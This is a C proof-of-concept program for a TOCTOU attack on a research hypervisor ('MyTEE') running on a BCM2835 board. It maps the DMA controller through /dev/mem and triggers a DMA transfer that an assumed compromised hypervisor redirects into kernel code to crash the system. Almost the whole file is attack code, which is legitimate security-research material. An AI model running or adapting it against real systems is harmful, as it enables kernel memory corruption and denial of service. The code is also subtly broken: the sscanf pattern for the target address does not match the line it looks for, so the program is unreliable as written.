/*
 * TOCTOU Attack Test - User Space
 *
 * This program triggers DMA from user space, which causes the
 * hypervisor to trap and verify the DMA CB. The compromised
 * hypervisor (hyp-stub.S label 215) will modify the CB after
 * verification, demonstrating the TOCTOU vulnerability.
 *
 * Usage: ./toctou_test
 *
 * ATTACK SCENARIO (MyTEE Paper):
 *   1. User program mmaps DMA controller MMIO
 *   2. Prepares legitimate CB with ALLOWED destination
 *   3. Writes CB address to DMA CONBLK_AD register
 *   4. Stage 2 trap → hypervisor verifies CB → PASSES
 *   5. [COMPROMISED] Hypervisor modifies CB.dst to kernel .text
 *   6. DMA executes → CORRUPTS KERNEL CODE → CRASH!
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <errno.h>

/* BCM2835 DMA Controller */
#define DMA_BASE_PHYS       0x3F007000
#define DMA_SIZE            0x1000
#define DMA_CHANNEL         5           /* Use channel 5 */
#define DMA_CHANNEL_OFFSET  (DMA_CHANNEL * 0x100)

/* DMA register offsets (within channel) */
#define DMA_CS              0x00
#define DMA_CONBLK_AD       0x04
#define DMA_DEBUG           0x20

/* DMA CS register bits */
#define DMA_CS_RESET        (1 << 31)
#define DMA_CS_ABORT        (1 << 30)
#define DMA_CS_WAIT_WRITES  (1 << 28)
#define DMA_CS_ACTIVE       (1 << 0)
#define DMA_CS_END          (1 << 1)
#define DMA_CS_INT          (1 << 2)
#define DMA_CS_ERROR        (1 << 8)

/* Bus address conversion */
#define PHYS_TO_BUS(x)      ((x) | 0xC0000000)
#define BUS_TO_PHYS(x)      ((x) & ~0xC0000000)

/* DMA Control Block structure */
struct dma_cb {
    uint32_t info;      /* Transfer information */
    uint32_t src;       /* Source address (bus) */
    uint32_t dst;       /* Destination address (bus) */
    uint32_t length;    /* Transfer length */
    uint32_t stride;    /* 2D stride */
    uint32_t next;      /* Next CB address (bus) */
    uint32_t pad[2];    /* Padding to 32 bytes */
};

/* Transfer info flags */
#define TI_WAIT_RESP    (1 << 3)
#define TI_D_INC        (1 << 4)
#define TI_S_INC        (1 << 8)

/* Global mappings */
static volatile uint32_t *dma_base = NULL;
static struct dma_cb *cb = NULL;
static uint32_t *payload = NULL;
static uint32_t *target = NULL;

/* Physical addresses (obtained from /proc/mytee_toctou) */
static uint32_t cb_phys = 0;
static uint32_t payload_phys = 0;
static uint32_t target_phys = 0;

static void cleanup(void)
{
    if (dma_base)
        munmap((void*)dma_base, DMA_SIZE);
    if (cb)
        munmap(cb, 4096);
    if (payload)
        munmap(payload, 4096);
    if (target)
        munmap(target, 4096);
}

static int read_phys_addresses(void)
{
    FILE *fp;
    char line[256];
    
    fp = fopen("/proc/mytee_toctou", "r");
    if (!fp) {
        perror("Failed to open /proc/mytee_toctou");
        return -1;
    }
    
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "CB Chain: phys=")) {
            sscanf(line, "  CB Chain: phys=%x", &cb_phys);
        } else if (strstr(line, "Payload: phys=")) {
            sscanf(line, "  Payload: phys=%x", &payload_phys);
        } else if (strstr(line, "Target:  phys=")) {
            sscanf(line, "  Target phys: %x", &target_phys);
        }
    }
    
    fclose(fp);
    
    printf("Physical addresses from driver:\n");
    printf("  CB chain:  0x%08x\n", cb_phys);
    printf("  Payload:   0x%08x\n", payload_phys);
    printf("  Target:    0x%08x\n", target_phys);
    
    return (cb_phys && payload_phys && target_phys) ? 0 : -1;
}

int main(int argc, char *argv[])
{
    int fd_mem;
    volatile uint32_t *chan;
    uint32_t cs;
    int timeout;
    
    printf("===========================================\n");
    printf("  TOCTOU Attack - User Space Trigger\n");
    printf("===========================================\n\n");
    
    printf("ATTACK SCENARIO:\n");
    printf("  Assumption: Attacker has compromised hypervisor\n");
    printf("  (hyp-stub.S label 215 contains malicious code)\n\n");
    
    printf("Attack Flow:\n");
    printf("  1. User program mmaps DMA MMIO\n");
    printf("  2. Prepare legitimate CB (ALLOWED destination)\n");
    printf("  3. Write CB addr to CONBLK_AD → Stage 2 trap\n");
    printf("  4. Hypervisor verifies CB → PASSES\n");
    printf("  5. [COMPROMISED] Hypervisor modifies CB.dst → kernel .text!\n");
    printf("  6. DMA executes → CORRUPTS KERNEL CODE!\n\n");
    
    /* First, trigger the driver to set up buffers */
    printf("[1] Triggering driver to prepare buffers...\n");
    system("echo reset > /proc/mytee_toctou 2>/dev/null");
    
    /* Read physical addresses from driver */
    if (read_phys_addresses() < 0) {
        printf("ERROR: Could not get physical addresses from driver.\n");
        printf("Make sure the mytee_toctou driver is loaded.\n");
        return 1;
    }
    
    /* Open /dev/mem for physical memory access */
    fd_mem = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd_mem < 0) {
        perror("Failed to open /dev/mem");
        printf("Try running as root or with sudo.\n");
        return 1;
    }
    
    /* Map DMA controller */
    printf("\n[2] Mapping DMA controller at 0x%08x...\n", DMA_BASE_PHYS);
    dma_base = mmap(NULL, DMA_SIZE, PROT_READ | PROT_WRITE, 
                    MAP_SHARED, fd_mem, DMA_BASE_PHYS);
    if (dma_base == MAP_FAILED) {
        perror("Failed to mmap DMA controller");
        close(fd_mem);
        return 1;
    }
    printf("  DMA base mapped at %p\n", dma_base);
    
    /* Map CB buffer */
    printf("\n[3] Mapping CB buffer at 0x%08x...\n", cb_phys);
    cb = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
              MAP_SHARED, fd_mem, cb_phys & ~0xFFF);
    if (cb == MAP_FAILED) {
        perror("Failed to mmap CB buffer");
        cleanup();
        close(fd_mem);
        return 1;
    }
    cb = (struct dma_cb*)((char*)cb + (cb_phys & 0xFFF));
    printf("  CB buffer mapped at %p\n", cb);
    
    /* Map payload buffer */
    printf("\n[4] Mapping payload buffer at 0x%08x...\n", payload_phys);
    payload = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd_mem, payload_phys & ~0xFFF);
    if (payload == MAP_FAILED) {
        perror("Failed to mmap payload buffer");
        cleanup();
        close(fd_mem);
        return 1;
    }
    payload = (uint32_t*)((char*)payload + (payload_phys & 0xFFF));
    printf("  Payload buffer mapped at %p\n", payload);
    
    /* Map target buffer */
    printf("\n[5] Mapping target buffer at 0x%08x...\n", target_phys);
    target = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                  MAP_SHARED, fd_mem, target_phys & ~0xFFF);
    if (target == MAP_FAILED) {
        perror("Failed to mmap target buffer");
        cleanup();
        close(fd_mem);
        return 1;
    }
    target = (uint32_t*)((char*)target + (target_phys & 0xFFF));
    printf("  Target buffer mapped at %p\n", target);
    
    /* Prepare payload */
    printf("\n[6] Preparing attack payload...\n");
    memset(payload, 0xDE, 4096);  /* 0xDEADBEEF pattern */
    payload[0] = 0xCAFEBABE;      /* Verify pattern */
    
    /* Clear target */
    target[0] = 0x12345678;
    printf("  Payload[0] = 0x%08x\n", payload[0]);
    printf("  Target[0] = 0x%08x (before attack)\n", target[0]);
    
    /* Prepare CB with ALLOWED destination */
    printf("\n[7] Preparing CB with ALLOWED destination...\n");
    cb->info = TI_S_INC | TI_D_INC | TI_WAIT_RESP;
    cb->src = PHYS_TO_BUS(payload_phys);
    cb->dst = PHYS_TO_BUS(target_phys);  /* ALLOWED destination */
    cb->length = 4;
    cb->stride = 0;
    cb->next = 0;
    cb->pad[0] = 0;
    cb->pad[1] = 0;
    
    printf("  CB.info   = 0x%08x\n", cb->info);
    printf("  CB.src    = 0x%08x (bus)\n", cb->src);
    printf("  CB.dst    = 0x%08x (bus) - ALLOWED!\n", cb->dst);
    printf("  CB.length = %d\n", cb->length);
    
    /* Get channel base */
    chan = dma_base + (DMA_CHANNEL_OFFSET / 4);
    
    /* Reset DMA channel */
    printf("\n[8] Resetting DMA channel %d...\n", DMA_CHANNEL);
    chan[DMA_CS/4] = DMA_CS_RESET;
    usleep(10);
    chan[DMA_CS/4] = DMA_CS_END | DMA_CS_INT | DMA_CS_ERROR;
    
    /* THE CRITICAL WRITE - This triggers Stage 2 trap! */
    printf("\n[9] *** WRITING CB ADDRESS TO CONBLK_AD ***\n");
    printf("    This write triggers Stage 2 trap!\n");
    printf("    Hypervisor will:\n");
    printf("      1. Copy CB to secure buffer\n");
    printf("      2. Verify CB addresses → PASS\n");
    printf("      3. [ATTACK] Modify CB.dst to 0xC0200000 (kernel .text!)\n");
    printf("      4. Execute DMA with modified CB!\n\n");
    
    /* Write CB address - TRIGGERS HYPERVISOR! */
    chan[DMA_CONBLK_AD/4] = PHYS_TO_BUS(cb_phys);
    __sync_synchronize();
    
    /* Start DMA */
    printf("[10] Starting DMA...\n");
    chan[DMA_CS/4] = DMA_CS_WAIT_WRITES | DMA_CS_ACTIVE;
    
    /* Wait for completion */
    timeout = 100000;
    while (timeout-- > 0) {
        cs = chan[DMA_CS/4];
        if (!(cs & DMA_CS_ACTIVE))
            break;
        usleep(1);
    }
    
    cs = chan[DMA_CS/4];
    printf("\n[11] DMA completed. CS = 0x%08x\n", cs);
    
    if (cs & DMA_CS_END) {
        printf("  DMA transfer completed successfully.\n");
    } else if (cs & DMA_CS_ERROR) {
        printf("  DMA ERROR! This may indicate write to protected memory.\n");
        printf("  (Actually, this is GOOD - it means attack worked!)\n");
    } else {
        printf("  DMA timeout or still running.\n");
    }
    
    printf("\n[12] Checking results...\n");
    printf("  Target[0] = 0x%08x (after attack)\n", target[0]);
    
    printf("\n===========================================\n");
    if (cs & (DMA_CS_END | DMA_CS_ERROR)) {
        printf("  TOCTOU ATTACK EXECUTED!\n");
        printf("\n");
        printf("  If CB.dst was modified to kernel .text,\n");
        printf("  the system should crash shortly.\n");
        printf("\n");
        printf("  Try running any command to trigger crash:\n");
        printf("    $ ls\n");
        printf("    $ cat /proc/cpuinfo\n");
    } else {
        printf("  Attack may not have triggered properly.\n");
        printf("  Check dmesg for details.\n");
    }
    printf("===========================================\n");
    
    cleanup();
    close(fd_mem);
    
    return 0;
}
